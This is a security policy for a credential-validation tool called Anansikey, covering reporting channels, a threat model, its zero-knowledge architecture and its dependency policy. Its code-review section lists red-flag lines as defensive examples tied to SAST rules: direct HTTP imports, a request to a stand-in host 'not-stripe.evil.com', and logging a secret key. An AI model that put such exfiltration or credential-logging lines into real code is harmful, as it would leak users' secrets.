# Security Policy

## Reporting a Vulnerability

**Do not open a public GitHub issue for security vulnerabilities.**

If you discover a security issue in Anansikey, please report it via one of:

- **GitHub Security Advisories**: [github.com/anansikey/anansikey/security/advisories/new](https://github.com/anansikey/anansikey/security/advisories/new)
- **Email**: security@anansikey.dev

We commit to:
- Acknowledging your report within **48 hours**
- Providing a status update within **7 days**
- Crediting you in the security advisory (unless you prefer anonymity)

---

## Threat Model

Anansikey's primary security concern is **not** the typical web app threat model. Because there is no backend server, there is no database to breach, no session tokens to steal, and no user accounts to compromise.

The real threats are:

### 1. Malicious Provider (Supply Chain)

A contributor could submit a provider that silently exfiltrates credentials to an attacker-controlled domain.

**Defenses:**
- `scripts/sast.js` scans every provider file for unauthorized outbound domains
- Providers cannot import `https`, `fetch`, or any HTTP library directly — the adapter is injected by the runtime
- All requests go through the single `request()` function in `packages/core/adapters/`
- GitHub Actions CI runs SAST on every PR — blocked before merge if any rule fires
- `CODEOWNERS`: changes to `packages/core/adapters/` require maintainer review

**What to look for in code review:**
```js
// RED FLAG: provider importing HTTP directly
import https from 'https';  // BLOCKED by SAST
import axios from 'axios';   // BLOCKED by SAST

// RED FLAG: hardcoded unknown hostname
request({ hostname: 'not-stripe.evil.com', ... });

// RED FLAG: credential in console
console.log('key is:', creds.secret_key);  // BLOCKED by SAST
```

### 2. Compromised npm Package

A malicious publish could replace the `anansikey` package with one that exfiltrates keys.

**Defenses:**
- npm 2FA enabled on the `anansikey` organization account
- All releases are tagged commits — users can verify the source
- Zero dependencies in `packages/core` — nothing to compromise via transitive deps
- `npm pack --dry-run` before every publish to verify contents

### 3. Compromised Web App CDN

If `anansikey.dev` is compromised, the web app could be replaced with one that exfiltrates keys.

**Defenses:**
- Web app is a single static HTML file — easy to audit, no server-side logic
- Users can run it locally: `open packages/web/index.html`
- Users can verify P1 in DevTools → Network tab before trusting the hosted version

### 4. Credentials in Memory

Credentials are briefly held in JavaScript memory during validation.

**Defenses:**
- Credentials are never written to disk
- Credentials are never included in error messages (SAST rule)
- Credentials are never sent to Anansikey servers (architectural constraint, not policy)
- After validation, the result object contains only the masked value

---

## Zero-Knowledge Architecture

This is the core security property. It is an architectural constraint, not a policy.

```
Your machine → Provider's API (e.g. api.stripe.com)
                     ↑
            No Anansikey server involved
```

**How to verify:**

CLI:
```bash
strace -e network anansikey check stripe --secret_key=sk_test_xxx 2>&1 | grep connect
# You will see: api.stripe.com:443
# You will NOT see: anansikey.dev or any Anansikey domain
```

Web app:
```
Open DevTools → Network tab → Run a validation
You will see: api.stripe.com
You will NOT see: anansikey.dev
```

---

## Supported Versions

| Version | Supported |
|---|---|
| 2.x | ✓ Current — receives security fixes |
| 1.x | ✗ End of life |
| 0.x | ✗ End of life |

---

## Dependency Policy

`packages/core` has **zero external dependencies** by design.

The `packages/cli` package may use Node.js built-ins only. No npm packages except `@anansikey/core`.

This policy eliminates the entire class of transitive dependency attacks on the validator core.

If a PR adds an external dependency to `packages/core`, it will be rejected.
